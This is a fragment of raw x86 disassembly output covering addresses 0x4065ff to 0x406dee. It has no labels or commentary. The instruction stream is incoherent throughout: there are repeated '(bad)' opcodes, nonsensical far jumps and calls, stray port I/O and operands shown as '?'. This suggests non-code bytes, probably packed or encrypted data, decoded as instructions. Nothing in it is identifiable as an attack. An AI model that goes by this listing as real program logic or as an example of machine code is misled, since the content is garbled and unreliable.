  4065ff:	add    ch,BYTE PTR cs:[esi*8-0x42186bab]
  406607:	in     al,0x29
  406609:	xor    ecx,ebx
  40660b:	loope  0x406686
  40660d:	jle    0x40659d
  40660f:	or     dh,0x57
  406612:	bound  ebp,QWORD PTR [ebp-0x75]
  406615:	iret   
  406616:	adc    al,0x2b
  406618:	mov    eax,0x326e455
  40661d:	ja     0x40661f
  40661f:	cld    
  406620:	sbb    esi,DWORD PTR [ecx]
  406622:	fidivr DWORD PTR ds:0x5e362165
  406628:	push   edi
  406629:	stc    
  40662a:	jns    0x4066a8
  40662c:	jo     0x406651
  40662e:	(bad)  
  40662f:	int3   
  406630:	add    WORD PTR [ebx+eax*1-0x334755f6],cx
  406638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406639:	ret    0x431
  40663c:	sub    BYTE PTR [edx],dh
  40663e:	inc    ebp
  40663f:	jge    0x406645
  406641:	jnp    0x4065db
  406643:	cmp    dh,BYTE PTR [esi]
  406645:	cdq    
  406646:	push   ebx
  406647:	scas   eax,DWORD PTR es:[edi]
  406648:	and    ch,ch
  40664a:	add    edi,ecx
  40664c:	xor    DWORD PTR [edx-0x47],esp
  40664f:	cmp    eax,0x8a643867
  406654:	sub    esi,DWORD PTR ds:0x1ca24c93
  40665a:	ja     0x4066be
  40665c:	cmp    al,0x6
  40665e:	inc    edi
  40665f:	add    DWORD PTR [eax],0x3f2f95ab
  406665:	sub    BYTE PTR [edx],dh
  406667:	clc    
  406668:	std    
  406669:	dec    esp
  40666a:	out    0x8f,al
  40666c:	(bad)  
  40666d:	push   ds
  40666e:	pop    edx
  40666f:	pop    eax
  406670:	add    dl,BYTE PTR [ebp+ecx*8+0x3673a6af]
  406677:	push   edi
  406678:	and    esi,DWORD PTR [eax-0x6fb43590]
  40667e:	fadd   DWORD PTR [ecx]
  406680:	cli    
  406681:	ffree  st(2)
  406683:	mov    ds:0x902ca8d1,al
  406688:	adc    dl,dl
  40668a:	nop
  40668b:	repz or al,0x34
  40668e:	add    DWORD PTR [edx],eax
  406690:	and    edi,esi
  406692:	cwde   
  406693:	adc    DWORD PTR [esi],0x69
  406696:	cs adc al,0x45
  406699:	stc    
  40669a:	iret   
  40669b:	mov    esp,?
  40669d:	or     ch,BYTE PTR [esi+0x59]
  4066a0:	jno    0x4066e0
  4066a2:	jne    0x4066b8
  4066a4:	ins    BYTE PTR es:[edi],dx
  4066a5:	and    cl,ch
  4066a7:	jbe    0x406663
  4066a9:	and    eax,DWORD PTR [edi-0x31]
  4066ac:	inc    esp
  4066ad:	jmp    0x40666c
  4066af:	int    0x6
  4066b1:	lea    esp,[edi]
  4066b3:	jmp    0x80d2:0x33433bc3
  4066ba:	fdiv   QWORD PTR [eax]
  4066bc:	inc    ecx
  4066bd:	out    0x4a,eax
  4066bf:	mov    esi,0x3cfa4b6e
  4066c4:	mul    DWORD PTR [eax-0x4540e67e]
  4066ca:	in     eax,0x66
  4066cc:	jo     0x406688
  4066ce:	sahf   
  4066cf:	cmp    eax,0xccf69a9d
  4066d4:	adc    esp,edi
  4066d6:	add    dl,BYTE PTR [ebp+0x69effa66]
  4066dc:	fs and cl,ch
  4066df:	and    ebp,eax
  4066e1:	dec    edi
  4066e2:	xchg   ebx,eax
  4066e3:	out    dx,al
  4066e4:	pop    ecx
  4066e5:	ja     0x406729
  4066e7:	retf   
  4066e8:	(bad)  
  4066e9:	adc    bl,al
  4066eb:	xor    DWORD PTR [edx+edi*2],ebp
  4066ee:	out    0x16,al
  4066f0:	lods   eax,DWORD PTR ds:[esi]
  4066f1:	test   al,0x3b
  4066f3:	jno    0xe6cb4e3b
  4066f9:	xor    ebx,DWORD PTR [ebp-0x79]
  4066fc:	ror    DWORD PTR [ebx],0x1f
  4066ff:	ret    
  406700:	loop   0x40677b
  406702:	out    dx,eax
  406703:	retf   0x65ef
  406706:	test   al,0x99
  406708:	and    al,0xb8
  40670a:	call   0x423fbd44
  40670f:	dec    esp
  406710:	and    eax,0xe1ec99eb
  406715:	in     al,dx
  406716:	mov    dl,0x37
  406718:	cmp    edi,DWORD PTR [ecx-0x29e5356a]
  40671e:	sahf   
  40671f:	out    dx,eax
  406720:	dec    eax
  406721:	ds xor ah,ch
  406724:	mov    ds:0x541941f,eax
  406729:	out    dx,eax
  40672a:	cmp    al,0xdd
  40672c:	push   edi
  40672d:	jo     0x406772
  40672f:	sbb    esi,DWORD PTR [ecx]
  406731:	adc    BYTE PTR [ecx],dh
  406733:	imul   edx,esp,0xfffffff4
  406736:	sbb    edi,DWORD PTR [edx+0x60]
  406739:	shr    DWORD PTR [edi-0x23f953f5],1
  40673f:	adc    dl,cl
  406741:	pop    esi
  406742:	push   ds
  406743:	xor    ebx,DWORD PTR [ecx]
  406745:	outs   dx,BYTE PTR ds:[esi]
  406746:	inc    edx
  406747:	sbb    BYTE PTR [edx+0x3554db0d],bh
  40674d:	sahf   
  40674e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40674f:	int    0x9
  406751:	test   DWORD PTR [ecx],0xd95ca29d
  406757:	jae    0x40674d
  406759:	in     al,dx
  40675a:	mov    bl,0xf1
  40675c:	cmc    
  40675d:	popa   
  40675e:	adc    eax,DWORD PTR fs:[ebx+0x29a77f01]
  406765:	mov    ah,ch
  406767:	clc    
  406768:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406769:	cmp    DWORD PTR [eax-0x2a],esp
  40676c:	leave  
  40676d:	xor    DWORD PTR [eax-0x40],esi
  406770:	jl     0x4067d6
  406772:	(bad)  
  406773:	sbb    bl,BYTE PTR [edx+0x183ab37c]
  406779:	call   esi
  40677b:	clc    
  40677c:	stc    
  40677d:	(bad)  
  40677e:	jae    0x4067b2
  406780:	cmp    esi,DWORD PTR ds:0xaffe3061
  406786:	leave  
  406787:	jnp    0x406710
  406789:	loope  0x406756
  40678b:	sahf   
  40678c:	mov    ebx,0x146cb774
  406791:	pop    esi
  406792:	mov    esi,0x8965941a
  406797:	stos   DWORD PTR es:[edi],eax
  406798:	cmp    eax,0xac8507f2
  40679d:	mov    eax,0x33ebc1c9
  4067a2:	mov    ds:0xdaef547d,al
  4067a7:	mov    eax,0x8dc1ce4
  4067ac:	adc    cl,BYTE PTR [eax]
  4067ae:	lahf   
  4067af:	pop    ds
  4067b0:	sbb    al,0x5b
  4067b2:	mov    bh,BYTE PTR [edi]
  4067b4:	mov    edx,0xd862683
  4067b9:	pop    ebp
  4067ba:	add    al,0x16
  4067bc:	inc    edi
  4067bd:	inc    eax
  4067be:	push   ebx
  4067bf:	mov    DWORD PTR [esi-0x12c83ee],esi
  4067c5:	test   DWORD PTR [ecx+0x4c],ecx
  4067c8:	inc    edi
  4067c9:	lahf   
  4067ca:	inc    ebx
  4067cb:	jmp    0x406801
  4067cd:	mov    ah,BYTE PTR [ecx+0x16]
  4067d0:	cs push esp
  4067d2:	das    
  4067d3:	out    0x92,al
  4067d5:	es xchg esp,eax
  4067d7:	jne    0x40677b
  4067d9:	dec    ebx
  4067da:	arpl   di,bx
  4067dc:	sub    DWORD PTR [edx],ecx
  4067de:	scas   eax,DWORD PTR es:[edi]
  4067df:	sbb    al,0xa5
  4067e1:	(bad)  
  4067e2:	out    dx,al
  4067e3:	mov    ecx,?
  4067e5:	lds    edx,FWORD PTR [esi-0x4c32f880]
  4067eb:	push   esp
  4067ec:	sbb    BYTE PTR [edx-0x7e],cl
  4067ef:	int3   
  4067f0:	jo     0x406819
  4067f2:	mov    al,0xf2
  4067f4:	push   ss
  4067f5:	pop    eax
  4067f6:	loop   0x406868
  4067f8:	call   0x9003c5e1
  4067fd:	pop    es
  4067fe:	xchg   ebx,eax
  4067ff:	in     al,0x9d
  406801:	out    dx,eax
  406802:	jbe    0x406832
  406804:	in     al,0x90
  406806:	test   eax,0x699ca15e
  40680b:	js     0x40681f
  40680d:	mov    ds,WORD PTR [ecx+0x6]
  406810:	in     al,dx
  406811:	cmc    
  406812:	lahf   
  406813:	test   ax,0xcba7
  406817:	add    dh,BYTE PTR [ecx]
  406819:	xor    al,0x7b
  40681b:	scas   al,BYTE PTR es:[edi]
  40681c:	mov    bh,0x6e
  40681e:	and    esi,DWORD PTR [edi]
  406820:	mov    ecx,0xd92cdae3
  406825:	call   0x3e12:0x3c9cb739
  40682c:	and    eax,DWORD PTR [esi]
  40682e:	jae    0x4067e5
  406830:	sub    dl,BYTE PTR [esi-0x284d56eb]
  406836:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406837:	adc    al,0xb4
  406839:	xchg   BYTE PTR ds:0x1b977303,dl
  40683f:	(bad)  
  406840:	enter  0xda5,0x93
  406844:	inc    ebp
  406845:	add    ch,BYTE PTR [edi+edi*1]
  406848:	xchg   esp,eax
  406849:	test   al,0x79
  40684b:	(bad)  
  40684c:	jmp    0x39af4528
  406851:	mov    dh,BYTE PTR [edx]
  406853:	ins    DWORD PTR es:[edi],dx
  406854:	sbb    edi,DWORD PTR [esi+0x19]
  406857:	add    dh,dh
  406859:	(bad)  
  40685a:	jbe    0x406865
  40685c:	inc    edx
  40685d:	sub    DWORD PTR [ecx+edx*4],0xd
  406861:	dec    eax
  406862:	add    al,0x2f
  406864:	add    bh,dh
  406866:	test   BYTE PTR [esp+eiz*8],cl
  406869:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40686a:	out    dx,eax
  40686b:	jae    0x406804
  40686d:	outs   dx,DWORD PTR ds:[esi]
  40686e:	cld    
  40686f:	mov    bl,0x9f
  406871:	adc    esp,DWORD PTR [eax+0x66]
  406874:	ins    DWORD PTR es:[edi],dx
  406875:	and    al,0x5
  406877:	sbb    al,0xdf
  406879:	mov    BYTE PTR [esp+esi*4-0x29338b7c],dh
  406880:	lock inc ecx
  406882:	jnp    0x406830
  406884:	and    DWORD PTR [edx],0xf8568802
  40688a:	sahf   
  40688b:	ins    BYTE PTR es:[edi],dx
  40688c:	cmp    DWORD PTR [edx],ecx
  40688e:	stc    
  40688f:	mov    dl,0x6a
  406891:	xor    al,0xcb
  406893:	fsub   QWORD PTR [ebx]
  406895:	inc    edi
  406896:	js     0x406883
  406898:	arpl   WORD PTR [eax-0x56],bp
  40689b:	js     0x406862
  40689d:	dec    edi
  40689e:	test   al,0x35
  4068a0:	xor    DWORD PTR [esi*1+0xabe10e6],edi
  4068a7:	retf   0x3906
  4068aa:	xchg   esp,eax
  4068ab:	nop/reserved BYTE PTR [esi-0x14]
  4068af:	or     al,0xa7
  4068b1:	dec    eax
  4068b2:	mov    edx,DWORD PTR [ecx+edx*2]
  4068b5:	ror    edx,0x16
  4068b8:	fild   DWORD PTR [esi+0x1bc28483]
  4068be:	push   ds
  4068bf:	inc    ecx
  4068c0:	out    dx,eax
  4068c1:	or     ch,BYTE PTR [ecx]
  4068c3:	stc    
  4068c4:	not    DWORD PTR [eax]
  4068c6:	xor    eax,ebp
  4068c8:	(bad)  
  4068c9:	aaa    
  4068ca:	jae    0x4068b5
  4068cc:	mov    ?,ebx
  4068ce:	sub    DWORD PTR [ebx-0x72ff14cb],0xef6671e4
  4068d8:	fwait
  4068d9:	mov    ebx,0x74562ea2
  4068de:	sub    eax,0xd16fc64c
  4068e3:	or     eax,0x5b1bf0c2
  4068e8:	mov    bl,0x6d
  4068ea:	pop    ss
  4068eb:	jb     0x4068cd
  4068ed:	outs   dx,BYTE PTR ds:[esi]
  4068ee:	push   ecx
  4068ef:	rcr    ah,0xcb
  4068f2:	push   cs
  4068f3:	jbe    0x40696f
  4068f5:	ins    DWORD PTR es:[edi],dx
  4068f6:	mov    WORD PTR [ebp-0xd],fs
  4068f9:	repz icebp 
  4068fb:	fs (bad) 
  4068fe:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4068ff:	push   0x1d
  406901:	xor    edi,edx
  406903:	(bad)  
  406904:	mov    DWORD PTR ds:[edx],eax
  406907:	stc    
  406908:	add    eax,0xf6907cbe
  40690d:	repz gs inc edi
  406910:	sub    ah,BYTE PTR [esi+0x29]
  406913:	pusha  
  406914:	or     ebx,DWORD PTR [edx+ecx*2-0x48]
  406918:	pop    edi
  406919:	loop   0x4068d4
  40691b:	dec    eax
  40691c:	loopne 0x40694a
  40691e:	push   eax
  40691f:	adc    eax,0xa2595b34
  406924:	jmp    0x406919
  406926:	repz js 0x406916
  406929:	repnz sub edx,DWORD PTR [edi-0x42813ebe]
  406930:	xor    DWORD PTR [edx-0x2b192175],ebp
  406936:	jmp    FWORD PTR [ebx-0x21]
  406939:	clc    
  40693a:	xor    ebp,ebp
  40693c:	arpl   WORD PTR [eax-0x4bce088d],ax
  406942:	dec    eax
  406943:	jge    0x4069aa
  406945:	retf   0x6f4a
  406948:	xlat   BYTE PTR ds:[ebx]
  406949:	les    esp,FWORD PTR [ebx+0x2c85dede]
  40694f:	adc    DWORD PTR [ecx-0x61],ecx
  406952:	mov    esp,0xfa952e21
  406957:	lods   eax,DWORD PTR ds:[esi]
  406958:	in     al,0x9d
  40695a:	pop    edi
  40695b:	loope  0x4068fa
  40695d:	dec    esp
  40695e:	mov    eax,ds:0xac29a550
  406963:	xchg   esp,eax
  406964:	sbb    esi,esp
  406966:	ja     0x406957
  406968:	push   es
  406969:	or     BYTE PTR ds:0xc48f45c8,bl
  40696f:	cs mov esi,0xfca9963f
  406975:	jge    0x40699a
  406977:	jo     0x4069e7
  406979:	sub    cl,al
  40697b:	jo     0x406998
  40697d:	add    BYTE PTR [ebx+ecx*8+0x4d92f8f7],bl
  406984:	and    DWORD PTR [esp+esi*8-0x7b68bf44],0x7
  40698c:	lea    ebx,[edx*8-0x50c2d4a2]
  406993:	add    al,0xf0
  406995:	mov    dl,0x86
  406997:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406998:	sub    ch,dh
  40699a:	mov    ebp,0xd80a7d7a
  40699f:	add    al,0x8d
  4069a1:	jmp    0xe1ccfc1f
  4069a6:	fnsave [ebx]
  4069a8:	not    BYTE PTR [edi]
  4069aa:	rcl    BYTE PTR [esi],0x5e
  4069ad:	jbe    0x4069a2
  4069af:	mov    bh,0x79
  4069b1:	arpl   WORD PTR [edx+0x16fa06dc],bx
  4069b7:	xor    al,0x3
  4069b9:	retf   
  4069ba:	dec    esp
  4069bb:	call   0xd7ed:0xc0e9c501
  4069c2:	call   0x374d:0xdd8ee2ba
  4069c9:	dec    eax
  4069ca:	lock (bad) 
  4069cc:	sub    DWORD PTR [eax+edi*8-0x72],ebx
  4069d0:	mov    dl,0x35
  4069d2:	mov    BYTE PTR [ecx-0x3b],ah
  4069d5:	and    eax,0xe4e5163
  4069da:	fwait
  4069db:	jmp    0xfdacbc29
  4069e0:	add    eax,0xe5643f24
  4069e5:	mov    esi,0x221d3807
  4069ea:	gs out dx,al
  4069ec:	cld    
  4069ed:	push   ss
  4069ee:	add    di,WORD PTR [edi+0x3226e3da]
  4069f5:	ds mov esp,0x583d0d5c
  4069fb:	inc    edx
  4069fc:	shr    cl,1
  4069fe:	pop    esp
  4069ff:	mov    ebp,0xd57885c
  406a04:	mov    ds:0x3c17f96f,eax
  406a09:	jl     0x406a0a
  406a0b:	loop   0x406a21
  406a0d:	cmp    edi,ebp
  406a0f:	or     bh,bl
  406a11:	rcl    BYTE PTR [edi],cl
  406a13:	retf   0x61dc
  406a16:	(bad)  
  406a17:	xor    esp,esp
  406a19:	mov    ch,0xc9
  406a1b:	fwait
  406a1c:	les    ebx,FWORD PTR [edi-0x5a545360]
  406a22:	cmp    edx,DWORD PTR [ecx-0x44]
  406a25:	fs loopne 0x406a64
  406a28:	push   ecx
  406a29:	or     al,dh
  406a2b:	inc    ecx
  406a2c:	arpl   WORD PTR [ebx+0x2991162f],sp
  406a32:	inc    ecx
  406a33:	lea    edx,[esi+0x61625cb0]
  406a39:	mov    esi,0xf15f3b28
  406a3e:	shl    esp,cl
  406a40:	outs   dx,BYTE PTR ds:[esi]
  406a41:	mov    bh,0xa0
  406a43:	popa   
  406a44:	mov    ecx,ebx
  406a46:	dec    ebp
  406a47:	shr    DWORD PTR [edx+0x74],1
  406a4a:	mov    eax,0xd7214c48
  406a4f:	pop    edi
  406a50:	and    BYTE PTR [ebx],bh
  406a52:	add    eax,0xf2031652
  406a57:	mov    DWORD PTR [edi-0x17971282],esp
  406a5d:	(bad)  
  406a5e:	xlat   BYTE PTR ds:[ebx]
  406a5f:	sbb    ebx,DWORD PTR [ebp-0x2f]
  406a62:	stos   DWORD PTR es:[edi],eax
  406a63:	ret    0x3922
  406a66:	ficomp DWORD PTR [edx+eiz*8-0x57]
  406a6a:	retf   
  406a6b:	daa    
  406a6c:	mov    bh,0x2f
  406a6e:	push   eax
  406a6f:	test   BYTE PTR [ebp+0x16c13452],bh
  406a75:	cmc    
  406a76:	std    
  406a77:	xor    esi,DWORD PTR [edx+0x1d]
  406a7a:	imul   esp,DWORD PTR [edx],0xdab2b89d
  406a80:	xchg   ecx,eax
  406a81:	push   ebx
  406a82:	mov    ecx,0x8bfe598c
  406a87:	adc    esi,0xab555114
  406a8d:	dec    ecx
  406a8e:	and    bl,cl
  406a90:	and    eax,DWORD PTR [edx-0x4e60d69f]
  406a96:	mov    WORD PTR [ebx+0xa],?
  406a99:	mov    dl,0x8a
  406a9b:	idiv   BYTE PTR [eax]
  406a9d:	sub    DWORD PTR [ecx+0x2e],esp
  406aa0:	stos   BYTE PTR es:[edi],al
  406aa1:	(bad)  [edx+ecx*8+0x64]
  406aa5:	push   ebp
  406aa6:	xor    ecx,esp
  406aa8:	pop    edi
  406aa9:	pop    esi
  406aaa:	push   ecx
  406aab:	mov    ah,dh
  406aad:	arpl   WORD PTR [ecx-0x6],di
  406ab0:	xor    DWORD PTR [eax+ebp*4],edx
  406ab3:	mov    ebp,0xc476eea0
  406ab8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406ab9:	nop
  406aba:	sbb    al,BYTE PTR [ebp-0xc]
  406abd:	ins    BYTE PTR es:[edi],dx
  406abe:	mov    al,ds:0x8a77eed7
  406ac3:	sub    bh,0x8a
  406ac6:	frstor [edi+0x3e963b6c]
  406acc:	mov    ebp,0x5f411e78
  406ad1:	lahf   
  406ad2:	out    0x2d,al
  406ad4:	jle    0x406b4d
  406ad6:	lea    esi,[edi]
  406ad8:	aam    0xa8
  406ada:	jge    0x406abd
  406adc:	and    dh,BYTE PTR [ebp-0x7c155037]
  406ae2:	xchg   BYTE PTR [edx+0x2],cl
  406ae5:	(bad)  
  406ae6:	es in  al,dx
  406ae8:	xor    BYTE PTR [ebx-0x10],0xff
  406aec:	mov    ebp,DWORD PTR [ebx-0x4]
  406aef:	mov    bl,0x82
  406af1:	rol    DWORD PTR [esp+eiz*4+0x56012297],0x18
  406af9:	es cli 
  406afb:	mov    ds:0x55c29e6b,eax
  406b00:	ret    0x2c9b
  406b03:	mov    edi,0xdd0788c5
  406b08:	or     ebx,DWORD PTR [eax-0x41a4df28]
  406b0e:	fwait
  406b0f:	pop    ds
  406b10:	outs   dx,DWORD PTR fs:[esi]
  406b12:	dec    edx
  406b13:	inc    esi
  406b14:	ds aaa 
  406b16:	pop    es
  406b17:	pop    eax
  406b18:	adc    al,0xf2
  406b1a:	inc    ebp
  406b1b:	pop    esi
  406b1c:	or     BYTE PTR [eax+0x73936945],al
  406b22:	out    dx,al
  406b23:	cmp    DWORD PTR [eax+0x5f4b0f6d],ebp
  406b29:	jne    0x406b77
  406b2b:	fadd   QWORD PTR [ecx+0x4bf652cf]
  406b31:	or     al,0x9b
  406b33:	add    ecx,DWORD PTR [edx+0x4b982881]
  406b39:	push   edi
  406b3a:	ror    edx,cl
  406b3c:	inc    ebp
  406b3d:	fldenv [ecx-0x50]
  406b40:	addr16 mov bl,0xa7
  406b43:	arpl   WORD PTR [eax+0x4f],si
  406b46:	lea    esi,[esi-0x10]
  406b49:	or     dl,dh
  406b4b:	sahf   
  406b4c:	push   esi
  406b4d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406b4e:	(bad)
  406b52:	mov    eax,0x8ced484f
  406b57:	iret   
  406b58:	mov    ch,0x64
  406b5a:	xor    ebp,ebx
  406b5c:	lods   eax,DWORD PTR ds:[esi]
  406b5d:	push   edi
  406b5e:	sbb    BYTE PTR [ecx],al
  406b60:	cmovnp eax,DWORD PTR [ebx]
  406b63:	pop    eax
  406b64:	fldcw  WORD PTR [esp+edi*4]
  406b67:	inc    esi
  406b68:	mov    edx,0xc001f37f
  406b6d:	cmp    eax,0x8fc559a1
  406b72:	lods   al,BYTE PTR ds:[esi]
  406b73:	sbb    BYTE PTR [ebx-0x34],0xb5
  406b77:	call   0xc137:0x6d69b1b5
  406b7e:	retf   
  406b7f:	push   cs
  406b80:	pop    ds
  406b81:	push   es
  406b82:	es js  0x406b42
  406b85:	xor    DWORD PTR [ecx+ebx*8],esi
  406b88:	add    BYTE PTR [ebp+0x21],bh
  406b8b:	adc    edx,edx
  406b8d:	sub    ebx,DWORD PTR [edx+0x1]
  406b90:	test   BYTE PTR [ebx+edx*2+0x5],0xb1
  406b95:	clc    
  406b96:	clc    
  406b97:	adc    ebp,DWORD PTR [ecx+0x76]
  406b9a:	lock mov ds:0x49a4a04,al
  406ba0:	outs   dx,DWORD PTR ds:[esi]
  406ba1:	test   dh,dl
  406ba3:	dec    ebp
  406ba4:	pop    ebx
  406ba5:	add    BYTE PTR [edx-0x4a61a3ae],al
  406bab:	inc    esp
  406bac:	imul   edi,DWORD PTR [esi-0x5d],0x2838b2e9
  406bb3:	xchg   ecx,eax
  406bb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406bb5:	mov    eax,0xeabc5e4
  406bba:	adc    ah,BYTE PTR [ebp+edx*1-0x2e]
  406bbe:	in     al,dx
  406bbf:	or     DWORD PTR [esi+0x42],0x1c
  406bc3:	js     0x406bc8
  406bc5:	cld    
  406bc6:	aas    
  406bc7:	(bad)  [eax-0x71e85afc]
  406bcd:	(bad)  
  406bce:	xlat   BYTE PTR ds:[ebx]
  406bcf:	outs   dx,DWORD PTR ds:[esi]
  406bd0:	imul   ebx,esp,0x7f
  406bd3:	fsubr  st(4),st
  406bd5:	xchg   esi,eax
  406bd6:	mov    esp,0xae90bff8
  406bdb:	out    0xff,al
  406bdd:	jo     0x406bb5
  406bdf:	mov    esi,0x8b703c1d
  406be4:	cmc    
  406be5:	dec    eax
  406be6:	pushf  
  406be7:	and    BYTE PTR [ebp+0x391edf5f],ch
  406bed:	ret    0x38cf
  406bf0:	call   0x9c38:0x9120fef9
  406bf7:	cmp    eax,0x1ef0a33d
  406bfc:	imul   esp,DWORD PTR [eax+0x45],0x6688f7a3
  406c03:	cmp    al,0xca
  406c05:	dec    esi
  406c06:	xor    al,bl
  406c08:	mov    WORD PTR [ebx+0x52d4a698],fs
  406c0e:	inc    ebx
  406c0f:	jo     0x406c72
  406c11:	mov    bh,0x87
  406c13:	in     eax,0x28
  406c15:	or     DWORD PTR [eax],edi
  406c17:	and    DWORD PTR [eax],ecx
  406c19:	and    al,0xb4
  406c1b:	lea    esp,[edx-0x5bf36e69]
  406c21:	mov    al,ds:0xb30c28a9
  406c26:	inc    ebp
  406c27:	jbe    0x406c0d
  406c29:	and    al,0xb7
  406c2b:	pop    esp
  406c2c:	pop    esp
  406c2d:	adc    bl,BYTE PTR [ebp+edi*4-0x27]
  406c31:	pop    ebx
  406c32:	popa   
  406c33:	cmp    esi,DWORD PTR [ebx+edi*2+0x27c0c6ca]
  406c3a:	jl     0x406bed
  406c3c:	sbb    BYTE PTR [ebx+0x36b4ad2b],ch
  406c42:	jl     0x406bd7
  406c44:	aas    
  406c45:	mov    al,0x67
  406c47:	add    DWORD PTR [eax],eax
  406c49:	mov    esi,gs
  406c4b:	in     al,dx
  406c4c:	dec    esp
  406c4d:	popf   
  406c4e:	out    dx,eax
  406c4f:	or     BYTE PTR [esi-0x1f250006],0x49
  406c56:	sbb    DWORD PTR ds:[ebx],0x5f
  406c5a:	mov    ch,0x54
  406c5c:	data16 out dx,al
  406c5e:	jb     0x406bf8
  406c60:	aad    0x23
  406c62:	stos   DWORD PTR es:[edi],eax
  406c63:	ror    bh,0xec
  406c66:	sbb    BYTE PTR [ecx-0x9457216],ah
  406c6c:	push   esp
  406c6d:	nop
  406c6e:	and    edx,ebx
  406c70:	pop    ebp
  406c71:	(bad)  
  406c72:	jmp    0xd502:0xd6c79bb0
  406c79:	push   cs
  406c7a:	daa    
  406c7b:	leave  
  406c7c:	push   edi
  406c7d:	or     al,0xd1
  406c7f:	clc    
  406c80:	loopne 0x406ccb
  406c82:	push   ecx
  406c83:	leave  
  406c84:	jnp    0x406c22
  406c86:	sbb    al,0xef
  406c88:	pop    es
  406c89:	dec    esp
  406c8a:	inc    ebp
  406c8b:	ret    
  406c8c:	sub    eax,0xc9aeff3f
  406c91:	cmp    eax,0xcf050066
  406c96:	push   edi
  406c97:	enterw 0x3049,0xb5
  406c9c:	and    BYTE PTR [ebp-0x25],0x7f
  406ca0:	retf   
  406ca1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406ca2:	adc    al,BYTE PTR [ecx+0x552f83cc]
  406ca8:	imul   esp,DWORD PTR [ecx+ebp*4-0x67],0x9ec4057d
  406cb0:	mov    edi,0xb8232ca6
  406cb5:	cli    
  406cb6:	clc    
  406cb7:	dec    esp
  406cb8:	das    
  406cb9:	or     edx,DWORD PTR [esi+0x35]
  406cbc:	push   es
  406cbd:	jg     0x406cb6
  406cbf:	outs   dx,BYTE PTR ds:[esi]
  406cc0:	cmp    DWORD PTR [ebx-0x5a],0x62
  406cc4:	(bad)  
  406cc5:	cmc    
  406cc6:	sbb    BYTE PTR [eax-0x4f],0xc4
  406cca:	ds jl  0x406cb5
  406ccd:	mov    edx,0x80115a0a
  406cd2:	cs dec eax
  406cd4:	cmp    DWORD PTR [edx+0xd8a3d3c],ebp
  406cda:	lahf   
  406cdb:	mov    ds:0x69425a16,eax
  406ce0:	xor    al,0x90
  406ce2:	pop    edx
  406ce3:	jb     0x406c7f
  406ce5:	xchg   esi,eax
  406ce6:	shl    bh,0xfe
  406ce9:	neg    DWORD PTR [ebp-0x77]
  406cec:	cmp    eax,0xa6f1eea1
  406cf1:	push   esi
  406cf2:	jp     0x406c83
  406cf4:	jmp    0x9b6a:0x7951778d
  406cfb:	mov    cl,0x2b
  406cfd:	fwait
  406cfe:	clc    
  406cff:	jo     0x406cd0
  406d01:	push   edx
  406d02:	jp     0x406d29
  406d04:	aam    0x5d
  406d06:	ss adc al,0x91
  406d09:	xchg   edx,eax
  406d0a:	js     0x406cc9
  406d0c:	test   BYTE PTR [ecx+0x686c52b8],cl
  406d12:	mov    ebx,edi
  406d14:	pop    ds
  406d15:	scas   eax,DWORD PTR es:[edi]
  406d16:	leave  
  406d17:	jp     0x406d1d
  406d19:	(bad)  
  406d1a:	mov    bl,0x44
  406d1c:	mov    bh,0x9f
  406d1e:	adc    DWORD PTR ds:0xe750280b,esi
  406d24:	xchg   ebx,eax
  406d25:	jle    0x406d38
  406d27:	hlt    
  406d28:	mov    cl,0xd0
  406d2a:	daa    
  406d2b:	cwde   
  406d2c:	popf   
  406d2d:	push   esp
  406d2e:	test   DWORD PTR [ecx+edx*8],esp
  406d31:	pop    ebp
  406d32:	repnz inc ebx
  406d34:	or     esp,0xffffff81
  406d37:	out    0x2b,al
  406d39:	pop    es
  406d3a:	jb     0x406cc7
  406d3c:	gs mov bl,0x18
  406d3f:	cmc    
  406d40:	jl     0x406cc5
  406d42:	mov    cl,0xd6
  406d44:	sub    al,bl
  406d46:	mov    bl,bl
  406d48:	and    DWORD PTR [ebx-0x2a],ecx
  406d4b:	push   es
  406d4c:	rcr    BYTE PTR [eax-0x51d440f5],0xea
  406d53:	or     eax,0xa425a358
  406d58:	in     al,dx
  406d59:	mov    eax,ds:0xba34f551
  406d5e:	les    edx,FWORD PTR [ecx+0x497f60a4]
  406d64:	retf   
  406d65:	pop    ss
  406d66:	retf   
  406d67:	nop
  406d68:	inc    edx
  406d69:	test   al,0x51
  406d6b:	outs   dx,DWORD PTR ds:[esi]
  406d6c:	sub    eax,DWORD PTR [ebp+0x4d]
  406d6f:	mov    ds:0x448a4281,al
  406d74:	jge    0x406d4a
  406d76:	clc    
  406d77:	rol    BYTE PTR [ecx-0x10ae6665],0xf6
  406d7e:	jmp    0x406dfc
  406d80:	mov    ecx,0xe7f61bf6
  406d85:	rcl    DWORD PTR [esi+0x50],cl
  406d88:	push   edx
  406d89:	retf   0xa815
  406d8c:	mov    BYTE PTR [eax+0x31],al
  406d8f:	add    dh,dl
  406d91:	jl     0x406dbb
  406d93:	adc    BYTE PTR [esp+eax*1-0x2d],bh
  406d97:	aam    0x87
  406d99:	mov    edi,DWORD PTR ds:[eax]
  406d9c:	adc    DWORD PTR ds:0xde3bebc6,edx
  406da2:	dec    eax
  406da3:	jbe    0x406e08
  406da5:	lahf   
  406da6:	cmp    eax,0x93ed8556
  406dab:	or     dh,BYTE PTR [eax+0x7533a79d]
  406db1:	(bad)  
  406db2:	repz leave 
  406db4:	sub    eax,0x52
  406db7:	xchg   edx,eax
  406db8:	icebp  
  406db9:	jmp    0x7a45:0x997adf36
  406dc0:	pushf  
  406dc1:	xor    BYTE PTR [edx+0x1],dl
  406dc4:	mov    esp,0x819cd661
  406dc9:	mov    ebx,DWORD PTR ds:0xee0eb35b
  406dcf:	push   0x6b93eb2b
  406dd4:	jmp    0xff52:0xb0ead1b1
  406ddb:	call   0xe8bf:0xad4be3b9
  406de2:	sbb    BYTE PTR ds:0xea5546fe,0x91
  406de9:	sub    al,0xd1
  406deb:	cdq    
  406dec:	mov    ah,0x1d
  406dee:	push   ebp
